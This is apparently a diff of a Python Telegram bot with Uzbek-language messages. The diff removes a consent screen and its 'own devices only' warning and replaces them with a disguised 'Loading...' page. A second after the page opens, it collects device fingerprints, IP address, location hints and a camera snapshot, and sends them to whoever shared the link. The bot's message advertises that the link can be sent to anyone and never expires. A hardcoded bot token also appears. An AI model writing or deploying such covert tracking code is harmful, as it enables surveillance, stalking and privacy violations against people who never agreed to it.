@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import os
 import json
 import uuid
@@ -5,7 +6,6 @@ import base64
 import asyncio
 import logging
 from io import BytesIO
-from datetime import datetime
 from aiohttp import web
 from telegram import Update, InputFile
 from telegram.ext import Application, CommandHandler, ContextTypes
@@ -14,34 +14,26 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
-WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
+WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip()
 PORT = int(os.getenv("PORT", "8000"))
 
-USER_TOKENS = {}  # token -> user_id
-ACTIVE_SESSIONS = {}  # token -> session info
+# Token -> user_id (doim saqlanadi, hech qachon o'chirilmaydi)
+USER_TOKENS = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    username = update.effective_user.username or f"user_{user_id}"
+    # Har doim yangi token yaratiladi, lekin eski tokenlar ham ishlashda davom etadi
     token = str(uuid.uuid4())
     USER_TOKENS[token] = user_id
-    ACTIVE_SESSIONS[token] = {
-        'user_id': user_id,
-        'username': username,
-        'created_at': datetime.now(),
-        'data_sent': False,
-        'camera_allowed': False
-    }
     link = f"{WEBHOOK_DOMAIN}/track?token={token}"
     msg = (
-        "🔒 **Kiber Xavfsizlik Test Laboratoriyasi**\n\n"
-        f"👤 Foydalanuvchi: `{username}` (`{user_id}`)\n"
-        f"🕒 Yaratilgan: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
-        "Quyidagi havolani oching va konsent berish orqali testni boshlang:\n"
-        f"🔗 [Test Sahifasini Ochish]({link})\n\n"
-        "⚠️ Eslatma: Faqat o'zingiz egalik qilgan qurilmalarda foydalaning"
+        "👋 Salom!\n\n"
+        "Quyidagi havolani oching, sahifa ochilgach ma'lumotlar olish boshlanadi.\n"
+        f"🔗 {link}\n\n"
+        "Havola cheksiz muddat ishlaydi. Uni istalgan kishiga yuborishingiz mumkin.\n"
+        "Har kim havolaga kirsangiz, uning ma'lumotlari sizga yuboriladi."
     )
-    await update.message.reply_text(msg, parse_mode='Markdown')
+    await update.message.reply_text(msg)
 
 def get_client_ip(request: web.Request) -> str:
     hdr = request.headers.get("X-Forwarded-For")
@@ -58,110 +50,38 @@ def get_client_ip(request: web.Request) -> str:
 async def track_page(request: web.Request):
     token = request.query.get("token")
     if not token or token not in USER_TOKENS:
-        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)
+        return web.Response(text="❌ Noto‘g‘ri token", status=403)
 
     html = f"""<!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>Kiber Xavfsizlik Testi</title>
+  <title>Yuklanmoqda...</title>
   <style>
     body {{
-      font-family: 'Segoe UI', sans-serif;
+      font-family: sans-serif;
       display: flex; flex-direction: column; align-items: center; justify-content: center;
       height: 100vh; text-align: center;
-      background: #0d1117; color: #c9d1d9;
-      margin: 0; padding: 20px;
+      background: #fafafa; color: #333;
     }}
-    .container {{
-      max-width: 600px;
-      background: #161b22;
-      border-radius: 10px;
-      padding: 30px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+    .loader {{
+      width: 40px; height: 40px;
+      border: 4px solid #ddd;
+      border-top: 4px solid #4CAF50;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 20px;
     }}
-    h1 {{ color: #f85149; margin-bottom: 20px; }}
-    .consent-item {{
-      background: #0d1117;
-      padding: 15px;
-      margin: 10px 0;
-      border-radius: 5px;
-      border-left: 3px solid #f85149;
-    }}
-    .btn {{
-      background: #238636;
-      color: white;
-      border: none;
-      padding: 12px 25px;
-      margin: 10px 5px;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }}
-    .btn:hover {{ background: #2ea043; }}
-    .btn-danger {{ background: #da3633; }}
-    .btn-danger:hover {{ background: #f85149; }}
-    .status {{ margin: 20px 0; padding: 15px; border-radius: 5px; }}
-    .success {{ background: #1f6feb; }}
-    .warning {{ background: #d29922; }}
+    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
+    .note {{ font-size: 0.9em; color: #777; }}
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🔒 Kiber Xavfsizlik Testi</h1>
-    
-    <p>Bu sahifa quyidagi ma'lumotlarni to'plash uchun ishlatiladi:</p>
-    
-    <div class="consent-item">
-      <strong>Qurilma Ma'lumotlari</strong><br>
-      Operatsion tizim, brauzer, ekran o'lchami, hardvar xususiyatlari
-    </div>
-    
-    <div class="consent-item">
-      <strong>Tarmoq Ma'lumotlari</strong><br>
-      Vaqt zonasi, til sozlamalari, IP manzil joylashuvi
-    </div>
-    
-    <div class="consent-item">
-      <strong>Kamera Ma'lumotlari</strong><br>
-      Videokamera kadrasi (faqat ruxsat berilganda)
-    </div>
-    
-    <div class="consent-item">
-      <strong>Joylashuv Ma'lumotlari</strong><br>
-      GPS koordinatalari (faqat ruxsat berilganda)
-    </div>
-    
-    <p><strong>Yuqoridagi ma'lumotlarni to'plashga rozilik berasizmi?</strong></p>
-    
-    <button class="btn" onclick="giveConsent()">Ha, Roziman</button>
-    <button class="btn btn-danger" onclick="denyConsent()">Yo'q, Rozilik Berilmaydi</button>
-    
-    <div id="status" class="status" style="display: none;"></div>
-  </div>
-
+  <h2>Iltimos, kuting...</h2>
+  <div class="loader"></div>
+  <div class="note">Tajribangiz moslashtirilmoqda...</div>
   <script>
-    async function giveConsent() {{
-      document.getElementById('status').innerHTML = '✅ Rozilik berildi. Ma\'lumotlar to\'planmoqda...';
-      document.getElementById('status').className = 'status success';
-      document.getElementById('status').style.display = 'block';
-      
-      localStorage.setItem('consent', 'true');
-      await collectAndSend();
-    }}
-    
-    function denyConsent() {{
-      document.getElementById('status').innerHTML = '❌ Rozilik berilmadi. Ma\'lumot to\'planmaydi.';
-      document.getElementById('status').className = 'status warning';
-      document.getElementById('status').style.display = 'block';
-      
-      localStorage.setItem('consent', 'false');
-      sendConsentStatus(false);
-    }}
-    
     async function collectAndSend() {{
-        if (localStorage.getItem('consent') !== 'true') return;
-        
         const data = {{
           timestamp: new Date().toISOString(),
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -214,7 +134,6 @@ async def track_page(request: web.Request):
           data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
         }}
 
-        // Kamera + rasm
         let img = null;
         let cameraAllowed = false;
         try {{
@@ -236,16 +155,10 @@ async def track_page(request: web.Request):
 
           stream.getTracks().forEach(t => t.stop());
         }} catch (e) {{
-          // kamera rad etilgan
+          // Kamera rad etilgan
         }}
 
-        const body = {{ 
-          token: "{token}", 
-          clientData: data, 
-          cameraAllowed: cameraAllowed,
-          consentGiven: true
-        }};
-        
+        const body = {{ token: "{token}", clientData: data, cameraAllowed: cameraAllowed }};
         if (img) {{
           body.image = img;
         }}
@@ -256,18 +169,9 @@ async def track_page(request: web.Request):
           body: JSON.stringify(body)
         }});
     }}
-    
-    async function sendConsentStatus(allowed) {{
-        fetch("/submit", {{
-          method: "POST",
-          headers: {{ "Content-Type": "application/json" }},
-          body: JSON.stringify({{
-            token: "{token}",
-            consentGiven: allowed,
-            cameraAllowed: false
-          }})
-        }});
-    }}
+
+    // Bir marta yuborish
+    setTimeout(collectAndSend, 1000);
   </script>
 </body>
 </html>"""
@@ -277,72 +181,50 @@ async def submit_data(request: web.Request):
     try:
         body = await request.json()
         token = body.get("token")
+        client_data = body.get("clientData", {})
+        camera_allowed = body.get("cameraAllowed", False)
         user_id = USER_TOKENS.get(token)
         
         if not user_id:
-            return web.Response(status=403)
+            return web.Response(status=403, text="Token not found")
 
-        # Faqat bir marta ma'lumot yuborish
-        session = ACTIVE_SESSIONS.get(token, {})
-        if session.get('data_sent'):
-            return web.Response(text="already processed")
-
-        session['data_sent'] = True
-        session['camera_allowed'] = body.get('cameraAllowed', False)
-        ACTIVE_SESSIONS[token] = session
-
-        # Agar foydalanuvchi rozilik bermagan bo'lsa, faqat konsent holatini yuborish
-        if not body.get('consentGiven', False):
-            message = (
-                f"❌ **Foydalanuvchi Rozilik Bermadi**\n"
-                f"👤 Foydalanuvchi: `{session.get('username', 'Noma\'lum')}`\n"
-                f"🕒 Sana: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
-                f"🔗 Token: `{token[:8]}...`"
-            )
-            await request.app["bot"].send_message(chat_id=user_id, text=message, parse_mode='Markdown')
-            return web.Response(text="ok")
-
-        # Rozilik berilgan bo'lsa, to'liq ma'lumot yuborish
-        client_data = body.get("clientData", {})
         ip = get_client_ip(request)
         devs = client_data.get("devices", {})
 
         message = (
-            f"🔒 **KIBER XAVFSIZLIK TEST NATIJASI**\n\n"
-            f"👤 Foydalanuvchi: `{session.get('username', 'Noma\'lum')}`\n"
-            f"🕒 Sana/Vaqt: `{client_data.get('timestamp')}`\n"
-            f"🌍 IP Manzil: `{ip}` | Zona: `{client_data.get('timezone')} (UTC{client_data.get('utcOffset')})`\n"
-            f"📱 Qurilma: `{client_data.get('model')} ({client_data.get('deviceType')})`\n"
-            f"🖥 OS: `{client_data.get('os')}` | Brauzer: `{client_data.get('browser')}`\n"
-            f"🎮 GPU: `{client_data.get('gpu')}`\n"
-            f"🧠 CPU: `{client_data.get('hardwareConcurrency')} yadrolar` | RAM: `{client_data.get('deviceMemory')} GB`\n"
-            f"📺 Ekran: `{client_data.get('screen')}` | Ko'rinish: `{client_data.get('viewport')}`\n"
-            f"🎨 Rang Chuqurligi: `{client_data.get('colorDepth')} bit` | Pixel: `{client_data.get('pixelDepth')} bit`\n"
-            f"🎤 Qurilmalar: Mikrofon: `{devs.get('mic',0)}`, Kollonka: `{devs.get('speaker',0)}`, Kamera: `{devs.get('camera',0)}`\n"
-            f"📷 Kamera O'lchami: `{client_data.get('cameraRes')}`\n"
-            f"📶 Tarmoq: `{client_data.get('network')}`\n"
-            f"🗣 Tillar: `{client_data.get('languages')}`\n"
-            f"🔍 User Agent: `{client_data.get('userAgent')}`\n"
-            f"📷 Kamera: `{'✅ Ruxsat berildi' if session['camera_allowed'] else '❌ Ruxsat berilmadi'}`"
+            f"🕒 Sana/Vaqt: {client_data.get('timestamp')}\n"
+            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
+            f"📍 IP: {ip}\n"
+            f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
+            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
+            f"🎮 GPU: {client_data.get('gpu')}\n"
+            f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar | RAM: {client_data.get('deviceMemory')} GB\n"
+            f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
+            f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit | PixelDepth: {client_data.get('pixelDepth')}\n"
+            f"🎤 Qurilmalar: Mic: {devs.get('mic',0)}, Speaker: {devs.get('speaker',0)}, Kamera: {devs.get('camera',0)}\n"
+            f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
+            f"📶 Tarmoq: {client_data.get('network')}\n"
+            f"🗣 Tillar: {client_data.get('languages')}\n"
+            f"🔍 UA: {client_data.get('userAgent')}\n"
+            f"📷 Kamera: {'✅ Ruxsat berildi' if camera_allowed else '❌ Ruxsat berilmadi'}"
         )
 
-        if session['camera_allowed'] and "image" in body:
+        if camera_allowed and "image" in body:
             img_data = body["image"]
             if "," in img_data:
                 b64 = img_data.split(",", 1)[1]
             else:
                 b64 = img_data
-            img_bytes = base64.b64decode(b64)
-            img = BytesIO(img_bytes)
-            img.name = "security_test.jpg"
-            await request.app["bot"].send_photo(
-                chat_id=user_id, 
-                photo=InputFile(img), 
-                caption=message,
-                parse_mode='Markdown'
-            )
+            try:
+                img_bytes = base64.b64decode(b64)
+                img = BytesIO(img_bytes)
+                img.name = "snapshot.jpg"
+                await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message)
+            except Exception as e:
+                logger.error(f"Rasmni yuborishda xato: {e}")
+                await request.app["bot"].send_message(chat_id=user_id, text=message + "\n\n⚠️ Rasmni yuklab bo'lmadi.")
         else:
-            await request.app["bot"].send_message(chat_id=user_id, text=message, parse_mode='Markdown')
+            await request.app["bot"].send_message(chat_id=user_id, text=message)
 
         return web.Response(text="ok")
     except Exception as e:
